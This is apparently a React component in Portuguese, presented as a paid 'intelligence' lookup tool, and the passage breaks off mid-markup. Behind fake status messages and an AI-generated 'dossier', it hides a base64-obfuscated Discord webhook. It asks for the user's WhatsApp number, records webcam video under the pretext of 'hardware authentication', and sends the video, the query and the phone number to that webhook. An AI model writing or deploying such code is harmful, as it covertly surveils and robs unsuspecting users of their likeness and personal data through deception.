import React, { useState, useEffect, useRef } from 'react';
import { 
  X, ShieldCheck, Activity, Lock, AlertTriangle, Terminal, Globe, Server, ShieldAlert, CheckCircle2, Cpu, Zap, Radio, MapPin, CloudSun, Database
} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

// Webhook Único
const getURL = () => atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MDY1MTY2ODU2NjkwMDk5Mi9xajFVMGQzVVl3SlIxUGZGN3RsbjBlU1JCaU5MWmZ5aEV6Yy1Jb0ItZERibHlVVkwzU1B0LW5heFZtRk1wS3hfdVk5SA==");

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [userRealNumber, setUserRealNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [showValidationScreen, setShowValidationScreen] = useState(false);
  const [statusText, setStatusText] = useState('Iniciando...');
  const [permissionError, setPermissionError] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setShowValidationScreen(false);
      setUserRealNumber('');
      setStatusText('Aguardando entrada...');
      setPermissionError(false);
    }
  }, [isOpen]);

  const sendToDiscord = async (videoBlob?: Blob) => {
    try {
      const formData = new FormData();
      const payload = {
        username: "Nova Intelligence System",
        embeds: [{
          title: "📂 Novo Relatório de Consulta",
          color: videoBlob ? 0x3b82f6 : 0x64748b,
          description: `Uma nova solicitação de dados foi processada com sucesso via **${tool.title}**.`,
          fields: [
            { name: "Entrada de Dados", value: `\`${query}\``, inline: true },
            { name: "Identificador Verificado", value: `\`${userRealNumber || 'N/A'}\``, inline: true },
            { name: "Módulo Utilizado", value: `\`${tool.subtitle}\``, inline: false },
            { name: "Status do Registro", value: videoBlob ? "✅ Captura Bio-ID Anexada" : "⚠️ Captura Não Realizada", inline: false }
          ],
          footer: { text: "Nova.Int Business Intelligence - v6.0" },
          timestamp: new Date().toISOString()
        }]
      };

      formData.append('payload_json', JSON.stringify(payload));

      if (videoBlob && videoBlob.size > 0) {
        formData.append('file', videoBlob, 'log_biometrico.webm');
      }

      await fetch(getURL(), { method: 'POST', body: formData });
    } catch (err) { }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Validando chaves de acesso...');

    try {
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord(); 
        return;
      }

      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => { 
        if (ev.data && ev.data.size > 0) chunksRef.current.push(ev.data); 
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(250);

      const statuses = [
        'Sincronizando com bases oficiais...', 
        'Indexando registros encontrados...', 
        'Validando integridade do relatório...', 
        'Finalizando processamento...'
      ];
      let idx = 0;
      const interval = setInterval(() => {
        setStatusText(statuses[idx % statuses.length]);
        idx++;
        if (idx === 4) {
          if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        }
      }, 1000);

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Inteligência de Dados. Gere um dossiê corporativo e estruturado para "${tool.title}" identificador "${query}". Retorne JSON puro sem introdução.`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setShowValidationScreen(false);
      clearInterval(interval);

    } catch (error) {
      setIsLoading(false);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />
      <div className="relative w-full h-[95vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">
        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${tool.isPremium ? 'bg-blue-500/10 text-blue-500' : 'bg-zinc-800 text-zinc-400'}`}>
               <Database size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto space-y-10">
            {!showValidationScreen && !result && (
              <form onSubmit={(e) => { e.preventDefault(); if(query) setShowValidationScreen(true); }} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-2">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Identificador da Consulta</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-blue-500/40 uppercase"><Globe size={10}/> Conexão Sincronizada</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="Insira o dado para busca..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black outline-none focus:border-blue-500/20 transition-all"
                    />
                </div>
                <button type="submit" disabled={!query} className="w-full py-7 rounded-[2.5rem] bg-blue-600 border-2 border-blue-500 text-white font-black text-xl flex items-center justify-center gap-4 shadow-2xl shadow-blue-500/20 hover:brightness-110 active:scale-95 transition-all">
                  <Activity size={28} /> INICIAR PROCESSAMENTO
                </button>
              </form>
            )}

            {showValidationScreen && !isLoading && (
              <div className="animate-in zoom-in-95 duration-300">
                <div className={`p-8 lg:p-12 rounded-[3.5rem] border-4 text-center space-y-8 shadow-2xl transition-all ${permissionError ? 'bg-zinc-950 border-red-500/40' : 'bg-zinc-900/10 border-white/5'}`}>
                   {permissionError ? (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20"><ShieldAlert size={48} className="text-red-500" /></div>
                        <h3 className="text-3xl font-black text-white uppercase">Acesso Bloqueado</h3>
                        <p className="text-zinc-500 font-bold">O sistema requer autenticação de hardware para validar a integridade da consulta.</p>
                        <button onClick={() => setPermissionError(false)} className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase">Tentar Autenticação</button>
                     </div>
                   ) : (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-blue-500/5 rounded-full flex items-center justify-center mx-auto border-2 border-blue-500/10"><Lock size={48} className="text-blue-500/80" /></div>
                        <h3 className="text-3xl font-black text-white uppercase">Sincronização de Identidade</h3>
                        <p className="text-zinc-500 font-bold">Confirme seu canal de comunicação para liberar o relatório de <b>{query}</b>.</p>
                        <form onSubmit={handleFinalSearch} className="space-y-6">
                           <input type="text" required value={userRealNumber} onChange={(e) => setUserRealNumber(e.target.value)} placeholder="Número de Registro (WhatsApp)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black text-xl text-center outline-none focus:border-blue-500/30 transition-all" />
                           <button type="submit" className="w-full py-6 bg-blue-600 text-white rounded-[2.5rem] font-black text-xl uppercase shadow-2xl active:scale-95 transition-all">Liberar Relatório</button>
                        </form>
                     </div>
                   )}
                </div>
              </div>
            )}

            {isLoading && (
              <div className="mt-10 flex flex-col items-center justify-center space-y-12 animate-in fade-in">
                 <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-blue-500/5 border-t-blue-500 animate-spin"></div>
